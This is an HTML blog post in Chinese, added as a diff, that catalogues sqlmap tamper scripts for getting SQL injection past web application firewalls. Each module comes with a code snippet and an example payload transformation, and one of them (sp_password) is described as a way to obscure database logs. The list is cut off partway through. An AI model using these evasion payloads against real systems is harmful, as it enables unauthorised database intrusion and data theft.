@@ -1,0 +1,1342 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="工具,Owasp top 10," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="spira1" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="sqlmap是一款注入神器广为人知，里面的tamper常常用来绕过WAF，很实用的模块，但是却常常被新手忽略（比如我），今天就整理总结一下tamper的用法以及tamper的编写 PS：工具既然叫做工具，就是用来辅助上单的，呸辅助我们完成某些任务的，仅仅适用于当进行某些重复的繁琐工作或是偶尔懒癌发作时，不能过度依赖 ALL表示所有数据库都适用，具体指出哪种数据库就表名只只适用于某些数据库 用法：1">
+<meta name="keywords" content="工具,Owasp top 10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap之tamper">
+<meta property="og:url" content="http://eagerseven.cn/2017/10/28/sqlmap_tamper/index.html">
+<meta property="og:site_name" content="spira1">
+<meta property="og:description" content="sqlmap是一款注入神器广为人知，里面的tamper常常用来绕过WAF，很实用的模块，但是却常常被新手忽略（比如我），今天就整理总结一下tamper的用法以及tamper的编写 PS：工具既然叫做工具，就是用来辅助上单的，呸辅助我们完成某些任务的，仅仅适用于当进行某些重复的繁琐工作或是偶尔懒癌发作时，不能过度依赖 ALL表示所有数据库都适用，具体指出哪种数据库就表名只只适用于某些数据库 用法：1">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-10-31T11:54:03.530Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqlmap之tamper">
+<meta name="twitter:description" content="sqlmap是一款注入神器广为人知，里面的tamper常常用来绕过WAF，很实用的模块，但是却常常被新手忽略（比如我），今天就整理总结一下tamper的用法以及tamper的编写 PS：工具既然叫做工具，就是用来辅助上单的，呸辅助我们完成某些任务的，仅仅适用于当进行某些重复的繁琐工作或是偶尔懒癌发作时，不能过度依赖 ALL表示所有数据库都适用，具体指出哪种数据库就表名只只适用于某些数据库 用法：1">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eagerseven.cn/2017/10/28/sqlmap_tamper/"/>
+
+
+
+
+
+  <title>sqlmap之tamper | spira1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">spira1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            Music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eagerseven.cn/2017/10/28/sqlmap_tamper/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="spira1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="spira1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqlmap之tamper</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-28T19:35:00+08:00">
+                2017-10-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2,250
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>sqlmap是一款注入神器广为人知，里面的tamper常常用来绕过WAF，很实用的模块，但是却常常被新手忽略（比如我），今天就整理总结一下tamper的用法以及tamper的编写</p>
+<p>PS：工具既然叫做工具，就是用来辅助上单的，呸辅助我们完成某些任务的，仅仅适用于当进行某些重复的繁琐工作或是偶尔懒癌发作时，不能过度依赖</p>
+<p>ALL表示所有数据库都适用，具体指出哪种数据库就表名只只适用于某些数据库</p>
+<h4 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py XXXXX -tamper &quot;模块名&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py:"></a>apostrophemask.py:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return payload.replace(&apos;\&apos;&apos;, &quot;%EF%BC%87&quot;) if payload else payload</span><br></pre></td></tr></table></figure>
+<p>将单引号url编码，用于过滤了单引号的情况</p>
+<p>1’ AND ‘1’=’1     <strong>to</strong>    1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p>
+<p>ALL</p>
+<h4 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py:"></a>apostrophenullencode.py:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return payload.replace(&apos;\&apos;&apos;, &quot;%00%27&quot;) if payload else payload</span><br></pre></td></tr></table></figure>
+<p>将单引号替换为宽字节unicode字符，用于过滤了单引号的情况</p>
+<p>1’ AND ‘1’=’1     <strong>to</strong>    1�’ AND �’1�’=�’1</p>
+<p>ALL</p>
+<h4 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py:"></a>appendnullbyte.py:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return &quot;%s%%00&quot; % payload if payload else payload</span><br></pre></td></tr></table></figure>
+<p>在你构造的payload后面加一个空字符</p>
+<p>1’ AND ‘1’=’1    <strong>to</strong>    1’ AND ‘1’=’1[]</p>
+<p>Access</p>
+<h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py:"></a>base64encode.py:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</span><br></pre></td></tr></table></figure>
+<p>这个看模块名也知道是base64编码</p>
+<p>1’ AND ‘1’=’1     <strong>to</strong>    MScgQU5EICcxJz0nMQ==</p>
+<p>ALL</p>
+<h4 id="between-py"><a href="#between-py" class="headerlink" title="between.py:"></a>between.py:</h4><p>这个代码有点长，就不贴代码了，可以自己去查看：C:\Python\SQLMap\tamper\between.py</p>
+<p>将大于符号和等号用between语句替换，用于过滤了大于符号和等号的情况</p>
+<p>1 AND A &gt; B    <strong>to</strong>    1 AND A NOT BETWEEN 0 AND B</p>
+<p>1 AND A = B    <strong>to</strong>    1 AND A BETWEEN B AND B</p>
+<p>ALL</p>
+<h4 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py:"></a>bluecoat.py:</h4><p>用随机的空白字符代替空格，并且将等号替换为like，用于过滤了空格和等号的情况</p>
+<p>union select <em> from users where id = 1    <strong>to</strong>    union%09select </em> from%09users where id like 1</p>
+<p>MySQL 5.1, SGOS</p>
+<h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py:"></a>chardoubleencode.py:</h4><p>用url编码两次你的payload</p>
+<p>select * from users    <strong>to</strong>    %2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</p>
+<p>ALL</p>
+<h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py:"></a>charencode.py:</h4><p>用url编码一次你的payload</p>
+<p>select * from users    <strong>to</strong>    %73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</p>
+<p>ALL</p>
+<h4 id="charunicodeencode-py："><a href="#charunicodeencode-py：" class="headerlink" title="charunicodeencode.py："></a>charunicodeencode.py：</h4><p>用unicode编码payload，只编码非编码字符</p>
+<p>select * from users    <strong>to</strong>    \u0073\u0065\u006c\u0065\u0063\u0074\u0020\u002a\u0020\u0066\u0072\u006f\u006d\u0020\u0075\u0073\u0065\u0072\u0073</p>
+<p>ALL，但是需要asp和asp.net环境</p>
+<h4 id="commalesslimit-py："><a href="#commalesslimit-py：" class="headerlink" title="commalesslimit.py："></a>commalesslimit.py：</h4><p>将payload中的逗号用offset代替，用于过滤了逗号并且是两个参数的情况</p>
+<p>limit 2,1    <strong>to</strong>    limit 1 offset 2</p>
+<p>MySQL</p>
+<h4 id="commalessmid-py："><a href="#commalessmid-py：" class="headerlink" title="commalessmid.py："></a>commalessmid.py：</h4><p>将payload中的逗号用from for代替，用于过滤了逗号并且是三参数的情况</p>
+<p>mid(version(), 1, 1)    <strong>to</strong>    mid(version() from 1 for 1)</p>
+<p>MySQL</p>
+<h4 id="commentbeforeparentheses-py："><a href="#commentbeforeparentheses-py：" class="headerlink" title="commentbeforeparentheses.py："></a>commentbeforeparentheses.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = re.sub(r&quot;\b(\w+)\(&quot;, &quot;\g&lt;1&gt;/**/(&quot;, retVal)</span><br></pre></td></tr></table></figure>
+<p>在某个单词后的第一个括号前面加入/**/，用于过滤了函数的情况</p>
+<p>union select group_concat(table_name)    <strong>to</strong>    union select group_concat/**/(table_name)</p>
+<p>ALL</p>
+<h4 id="concat2concatws-py："><a href="#concat2concatws-py：" class="headerlink" title="concat2concatws.py："></a>concat2concatws.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = payload.replace(&quot;CONCAT(&quot;, &quot;CONCAT_WS(MID(CHAR(0),0,0),&quot;)</span><br></pre></td></tr></table></figure>
+<p>用于过滤了concat函数的情况</p>
+<p>concat(1,2)    <strong>to</strong>    concat_ws(mid(char(0), 0, 0), 1, 2)</p>
+<p>MySQL</p>
+<h4 id="equaltolike-py："><a href="#equaltolike-py：" class="headerlink" title="equaltolike.py："></a>equaltolike.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = re.sub(r&quot;\s*=\s*&quot;, &quot; LIKE &quot;, retVal)</span><br></pre></td></tr></table></figure>
+<p>将等号用like代替，用于过滤了等号的情况</p>
+<p>select <em> from users where id=1    <strong>to</strong>    select </em> from users where id like 1</p>
+<p>ALL</p>
+<h4 id="escapequotes-py："><a href="#escapequotes-py：" class="headerlink" title="escapequotes.py："></a>escapequotes.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return payload.replace(&quot;&apos;&quot;, &quot;\\&apos;&quot;).replace(&apos;&quot;&apos;, &apos;\\&quot;&apos;)</span><br></pre></td></tr></table></figure>
+<p>将单引号转换成\\’，双引号转换成\\”，用于过滤了单引号或双引号的情况</p>
+<p>1’ and 1=1–+    <strong>to</strong>    1\\’ and 1=1–+</p>
+<p>ALL</p>
+<h4 id="greatest-py："><a href="#greatest-py：" class="headerlink" title="greatest.py："></a>greatest.py：</h4><p>用greatest代替大于符号，用于大于符号被过滤了的情况</p>
+<p>1 and a&gt;b    <strong>to</strong>    1 and greatest(a,b+1)=a</p>
+<p>ALL</p>
+<h4 id="halfversionedmorekeywords-py："><a href="#halfversionedmorekeywords-py：" class="headerlink" title="halfversionedmorekeywords.py："></a>halfversionedmorekeywords.py：</h4><p>在关键字前添加注释，用于过滤了关键字的情况</p>
+<p>union select 1,2    <strong>to</strong>    /*!0union/*!0select 1,2</p>
+<p>MySQL &lt; 5.1</p>
+<h4 id="htmlencode-py："><a href="#htmlencode-py：" class="headerlink" title="htmlencode.py："></a>htmlencode.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return re.sub(r&quot;[^\w]&quot;, lambda match: &quot;&amp;#%d;&quot; % ord(match.group(0)), payload) if payload else payload</span><br></pre></td></tr></table></figure>
+<p>从名字就知道是将payload进行html编码</p>
+<p>1’ and 1=1–+    <strong>to</strong>    &#49;&#39;&#32;&#97;&#110;&#100;&#32;&#49;&#61;&#49;&#45;&#45;&#43;</p>
+<p>ALL</p>
+<h4 id="ifnull2ifisnull-py："><a href="#ifnull2ifisnull-py：" class="headerlink" title="ifnull2ifisnull.py："></a>ifnull2ifisnull.py：</h4><p>将ifnull()函数转为if(isnull())函数，用于过滤了ifnull函数的情况</p>
+<p>ifnull(1, 2)    <strong>to</strong>    if(isnull(1), 2, 1)</p>
+<p>MySql</p>
+<h4 id="informationschemacomment-py："><a href="#informationschemacomment-py：" class="headerlink" title="informationschemacomment.py："></a>informationschemacomment.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = re.sub(r&quot;(?i)(information_schema)\.&quot;, &quot;\g&lt;1&gt;/**/.&quot;, payload)</span><br></pre></td></tr></table></figure>
+<p>在information_schema后面加上/**/，用于绕过对information_schema.的情况</p>
+<p>select table_name from information_schema.tables    <strong>to</strong>    select table_name from information_schema/**/.tables</p>
+<p>ALL</p>
+<h4 id="lowercase-py："><a href="#lowercase-py：" class="headerlink" title="lowercase.py："></a>lowercase.py：</h4><p>将payload里的大写转为小写</p>
+<p>UNION SELECT    <strong>to</strong>    union select</p>
+<p>ALL</p>
+<h4 id="modsecurityversioned-py："><a href="#modsecurityversioned-py：" class="headerlink" title="modsecurityversioned.py："></a>modsecurityversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过ModSecurity开源waf</p>
+<p>1 and 2&gt;1–+    <strong>to</strong>    1 /<em>!30874and 2&gt;1\</em>/–+</p>
+<p>MySQL</p>
+<h4 id="modsecurityzeroversioned-py："><a href="#modsecurityzeroversioned-py：" class="headerlink" title="modsecurityzeroversioned.py："></a>modsecurityzeroversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过waf，和上面类似</p>
+<p>1 and 2&gt;1–+    <strong>to</strong>    1 /<em>!00000and 2&gt;1\</em>/–+</p>
+<p>MySQL</p>
+<p>####multiplespaces.py：</p>
+<p> 在关键字周围添加多个空格</p>
+<p>union select 1,2–+    <strong>to</strong>    union         select       1,2–+</p>
+<p>ALL</p>
+<h4 id="nonrecursivereplacement-py："><a href="#nonrecursivereplacement-py：" class="headerlink" title="nonrecursivereplacement.py："></a>nonrecursivereplacement.py：</h4><p>关键字双写，可用于关键字过滤</p>
+<p>union select 1,2–+    <strong>to</strong>    uniounionn selecselectt 1,2–+</p>
+<p>ALL</p>
+<h4 id="overlongutf8-py："><a href="#overlongutf8-py：" class="headerlink" title="overlongutf8.py："></a>overlongutf8.py：</h4><p>这个不是很懂，也去网上搜了下，都说是”转换给定的payload当中的所有字符“，类似空格大于小于这种</p>
+<p>select field from table where 2&gt;1    <strong>to</strong>    select%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</p>
+<p>ALL</p>
+<h4 id="percentage-py："><a href="#percentage-py：" class="headerlink" title="percentage.py："></a>percentage.py：</h4><p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p>
+<p>select <em> from users    <strong>to</strong>    %s%e%l%e%c%t </em> %f%r%o%m %u%s%e%r%s</p>
+<p>ALL,但是需要ASP环境</p>
+<h4 id="plus2concat-py："><a href="#plus2concat-py：" class="headerlink" title="plus2concat.py："></a>plus2concat.py：</h4><p>用concat函数来替代加号，用于加号被过滤的情况</p>
+<p>select char(13)+char(114)+char(115) from user    <strong>to</strong>    select concat(char(113),char(114),char(115)) from user</p>
+<p>SQL Server 2012+</p>
+<h4 id="plus2fnconcat-py："><a href="#plus2fnconcat-py：" class="headerlink" title="plus2fnconcat.py："></a>plus2fnconcat.py：</h4><p>用fn concat来替代加号，和上面类似</p>
+<p>select char(13)+char(114)+char(115) from user    <strong>to</strong>    select {fn concat({ fn concat(char(113),char(114))},char(115))} from user</p>
+<p>Microsoft SQL Server 2008+</p>
+<h4 id="randomcase-py："><a href="#randomcase-py：" class="headerlink" title="randomcase.py："></a>randomcase.py：</h4><p>将payload随机大小写，可用于大小写绕过的情况</p>
+<p>union select 1,2–+    <strong>to</strong>    UniOn SElect 1,2–+</p>
+<p>ALL</p>
+<h4 id="randomcomments-py："><a href="#randomcomments-py：" class="headerlink" title="randomcomments.py："></a>randomcomments.py：</h4><p>在payload的关键字中间随机插入/**/，可用于绕过关键字过滤</p>
+<p>union select 1,2–+    <strong>to</strong>    un/**/ion sele/**/ct 1,2–+</p>
+<p>ALL</p>
+<h4 id="securesphere-py："><a href="#securesphere-py：" class="headerlink" title="securesphere.py："></a>securesphere.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return payload + &quot; and &apos;0having&apos;=&apos;0having&apos;&quot; if payload else payload</span><br></pre></td></tr></table></figure>
+<p>在payload后面加入字符串，可以自定义</p>
+<p>1’ and 1=1    <strong>to</strong>    1’ and 1=1 ‘0having’=’0having’</p>
+<p>ALL</p>
+<h4 id="sp-password-py："><a href="#sp-password-py：" class="headerlink" title="sp_password.py："></a>sp_password.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = &quot;%s%ssp_password&quot; % (payload, &quot;-- &quot; if not any(_ if _ in payload else None for _ in (&apos;#&apos;, &quot;-- &quot;)) else &quot;&quot;)</span><br></pre></td></tr></table></figure>
+<p>在payload语句后添加ssp_password，用于迷惑数据库日志</p>
+<p>1’  and 1=1–+    <strong>to</strong>    1 and 1=1– sp_password</p>
+<p>MSSQL</p>
+<h4 id="space2comment-py："><a href="#space2comment-py：" class="headerlink" title="space2comment.py："></a>space2comment.py：</h4><p>用/**/替代空格，用于空格的绕过</p>
+<p>union select 1,2–+    <strong>to</strong>    union/**/select/**/1,2–+</p>
+<p>ALL</p>
+<h4 id="space2dash-py："><a href="#space2dash-py：" class="headerlink" title="space2dash.py："></a>space2dash.py：</h4><p>用注释符–和一个随机字符串加一个换行符替换控制符</p>
+<p>union select 1,2–+    <strong>to</strong>    union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p>
+<p>MSSQL<br>SQLite</p>
+<h4 id="space2hash-py："><a href="#space2hash-py：" class="headerlink" title="space2hash.py："></a>space2hash.py：</h4><p>和上面类似，不过这儿是用#注释符</p>
+<p>union select 1,2–+    <strong>to</strong>    union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</p>
+<p>MySQL</p>
+<h4 id="space2morecomment-py："><a href="#space2morecomment-py：" class="headerlink" title="space2morecomment.py："></a>space2morecomment.py：</h4><p>将空格用/**_**/替代</p>
+<p>union select 1,2–+    <strong>to</strong>    union/**<em>**/select/**\</em>**/1,2–+</p>
+<p>ALL</p>
+<h4 id="space2morehash-py："><a href="#space2morehash-py：" class="headerlink" title="space2morehash.py："></a>space2morehash.py：</h4><p>和space2hash.py类似，但是这儿多一个#和换行符，具体看一下对比：</p>
+<p>space2hash.py：        union select 1,2–+    <strong>to</strong>    union  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A1,2–+</p>
+<p>space2morehash.py：union select 1,2–+    <strong>to</strong>    union  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A%23  HJHJhj  %0A  1,2–+</p>
+<p>MySQL &gt;= 5.1.13</p>
+<h4 id="space2mssqlblank-py："><a href="#space2mssqlblank-py：" class="headerlink" title="space2mssqlblank.py："></a>space2mssqlblank.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blanks = (&apos;%01&apos;, &apos;%02&apos;, &apos;%03&apos;, &apos;%04&apos;, &apos;%05&apos;, &apos;%06&apos;, &apos;%07&apos;, &apos;%08&apos;, &apos;%09&apos;, &apos;%0B&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0E&apos;, &apos;%0F&apos;, &apos;%0A&apos;)</span><br></pre></td></tr></table></figure>
+<p>用 这些随机空白符替换payload中的空格</p>
+<p>union select 1,2–+    <strong>to</strong>    union%01select%021,2–+</p>
+<p>SQL Server</p>
+<h4 id="space2mssqlhash-py："><a href="#space2mssqlhash-py：" class="headerlink" title="space2mssqlhash.py："></a>space2mssqlhash.py：</h4><p>用#加一个换行符替换payload中的空格</p>
+<p>union select 1,2–+ <strong>to</strong>    union%23%0Aselect%23%0A1,2–+</p>
+<p>MSSQL<br>MySQL</p>
+<h4 id="space2mysqlblank-py："><a href="#space2mysqlblank-py：" class="headerlink" title="space2mysqlblank.py："></a>space2mysqlblank.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blanks = (&apos;%09&apos;, &apos;%0A&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0B&apos;)</span><br></pre></td></tr></table></figure>
+<p>用这些随机空白符替换payload中的空格</p>
+<p>union select 1,2–+    <strong>to</strong>    union%09select%0D1,2–+</p>
+<p>MySQL</p>
+<h4 id="space2mysqldash-py："><a href="#space2mysqldash-py：" class="headerlink" title="space2mysqldash.py："></a>space2mysqldash.py：</h4><p>用–加一个换行符替换空格</p>
+<p>union select 1,2–+    <strong>to</strong>    union–%0Aselect–%0A1,2–+</p>
+<p>MySQL<br>MSSQL</p>
+<h4 id="space2plus-py："><a href="#space2plus-py：" class="headerlink" title="space2plus.py："></a>space2plus.py：</h4><p>用加号替换空格</p>
+<p>union select 1,2–+    <strong>to</strong>    union+select+1,2–+</p>
+<p>ALL</p>
+<h4 id="space2randomblank-py："><a href="#space2randomblank-py：" class="headerlink" title="space2randomblank.py："></a>space2randomblank.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blanks = (&quot;%09&quot;, &quot;%0A&quot;, &quot;%0C&quot;, &quot;%0D&quot;)</span><br></pre></td></tr></table></figure>
+<p>用这些随机空白符替换payload中的空格</p>
+<p>union select 1,2–+    <strong>to</strong>    union%09select%0C1,2–+</p>
+<p>ALL</p>
+<h4 id="symboliclogical-py："><a href="#symboliclogical-py：" class="headerlink" title="symboliclogical.py："></a>symboliclogical.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = re.sub(r&quot;(?i)\bAND\b&quot;, &quot;%26%26&quot;, re.sub(r&quot;(?i)\bOR\b&quot;, &quot;%7C%7C&quot;, payload))</span><br></pre></td></tr></table></figure>
+<p>用&amp;&amp;替换and，用||替换or，用于这些关键字被过滤的情况</p>
+<p>1 and 1=1    <strong>to</strong>    1 %26%26 1=1</p>
